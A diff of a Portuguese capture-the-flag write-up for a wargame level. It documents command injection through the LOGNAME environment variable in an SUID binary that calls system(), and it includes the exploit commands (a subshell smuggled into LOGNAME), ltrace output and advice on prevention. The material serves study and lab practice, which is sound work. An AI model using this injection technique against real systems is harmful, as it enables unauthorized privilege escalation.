@@ -1,43 +1,58 @@
 # 𝕃𝕖𝕧𝕖𝕝 𝟘𝟟
 
 ## 🎯 Objetivo
-Descrever brevemente o que encontramos ao logar neste nível (ex: um executável SUID, um script perl, um arquivo pcap).
+O objetivo deste nível é escalar privilégios abusando de um binário SUID que constrói e executa comandos do sistema baseados em variáveis de ambiente (Environment Variables) não sanitizadas.
 
 ## 🔍 Análise da Vulnerabilidade
-Explique aqui qual foi a falha encontrada.
-* **Tipo:** (Ex: Stack Buffer Overflow, Command Injection, Race Condition).
-* **Arquivo Alvo:** `/home/user/levelXX/binario`
-* **Comportamento:** O programa usa a função `strcpy` sem verificar o tamanho da entrada... (explique tecnicamente).
+
+* **Tipo:** *OS Command Injection* (Injeção de Comando) / *Insecure Environment Variable Usage*.
+* **Arquivo Alvo:** `level07` (Executável SUID em C).
+* **Comportamento:** Através de engenharia reversa dinâmica usando `ltrace`, observamos o comportamento interno do binário. O programa faz uma chamada para `getenv("LOGNAME")` para capturar o nome do usuário logado no sistema e, em seguida, formata essa string (usando `asprintf`) para jogá-la dentro de uma função `system()`.
+
+    O comando final executado pelo programa por debaixo dos panos é algo como:
+    `system("/bin/echo $LOGNAME")`
+
+    Como nós (usuários) temos controle total sobre as nossas próprias variáveis de ambiente antes de executar o programa, podemos alterar o valor de `LOGNAME` para conter um comando malicioso. Quando o `system()` rodar, o shell interpretará e executará a nossa injeção.
 
 ## 💻 Passos para Exploração (Exploit)
 
 1.  **Reconhecimento:**
-    Identificamos que o binário tem permissão SUID para o usuário `flagXX`.
-    Comando: `ls -l`
-
-2.  **Debugging (se aplicável):**
-    Encontramos o offset de memória 76 usando o GDB pattern create...
-    Endereço do buffer: `0xbffff...`
-
-3.  **Payload:**
-    Criamos um payload contendo:
-    `[Padding] + [Endereço de Retorno] + [NOP Sled] + [Shellcode]`
-
-    Comando exato utilizado:
+    Listamos os arquivos e identificamos o executável SUID alvo.
     ```bash
-    (python -c 'print "A"*76 + "\xef\xbe\xad\xde"') | ./levelXX
+    ls -al
+    # -rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07
     ```
 
-## 📜 Scripts Utilizados
-Se você criou um script python ou bash para automatizar, coloque-o na pasta `resources` e referencie aqui.
+2.  **Identificação do Arquivo:**
+    ```bash
+    file level07
+    # level07: setuid setgid ELF 32-bit LSB executable...
+    ```
 
-* `resources/exploit.py`: Script que gera a string maliciosa.
+3.  **Análise Dinâmica (Rastreamento de Funções):**
+    Utilizamos o `ltrace` para ver quais funções da biblioteca C o programa estava chamando.
+    ```bash
+    ltrace ./level07
+    # Saída revela as chamadas críticas:
+    # getenv("LOGNAME")
+    # asprintf(...)
+    # system("/bin/echo ...")
+    ```
+    > A saída do `ltrace` confirmou que o binário pega a variável `LOGNAME` e a passa para o `system()`.
+
+4.  **Preparação e Execução do Exploit:**
+    Alteramos o valor da variável de ambiente `LOGNAME` na nossa sessão atual. Injetamos uma subshell `$(getflag)`, usando aspas simples para garantir que o nosso próprio terminal não executasse o comando antecipadamente. Em seguida, executamos o binário vulnerável.
+    ```bash
+    export LOGNAME='$(getflag)'
+    ./level07
+    # Saída: Check flag.Here is your token : fiumuita...
+    ```
+    > O binário rodou `system("/bin/echo $(getflag)")`. O shell do sistema resolveu o `$(getflag)` com os privilégios do SUID (flag07) antes que o `echo` pudesse imprimir.
 
 ## 🚩 Solução / Flag
-(Opcional, mas útil para referência futura. Não coloque a flag literal se preferir, mas sim a senha obtida).
-
-Senha para o próximo nível: `xxxxxxxxxxxx`
+A injeção de comando através da variável de ambiente foi executada com sucesso, imprimindo a flag.
 
 ## 🛡️ Prevenção (Como corrigir)
-Como esse código deveria ter sido escrito para ser seguro?
-* *Exemplo:* Deveria ter sido usada a função `strncpy` ao invés de `strcpy` para limitar o tamanho da cópia.
+1. **Não confie no Ambiente**: Variáveis de ambiente (`getenv`) são inputs controlados pelo usuário. Elas nunca devem ser passadas diretamente para funções de execução, formatação ou acesso a arquivos sem uma sanitização rigorosa.
+
+2. **Evite a família system()**: Em C, o uso da função `system()` é desencorajado porque ela invoca um shell (`/bin/sh`) que pode ser facilmente manipulado. Se for estritamente necessário executar um comando do sistema, prefira as funções da família `exec()` (como `execve`), passando os argumentos de forma estruturada e não como uma string concatenada.
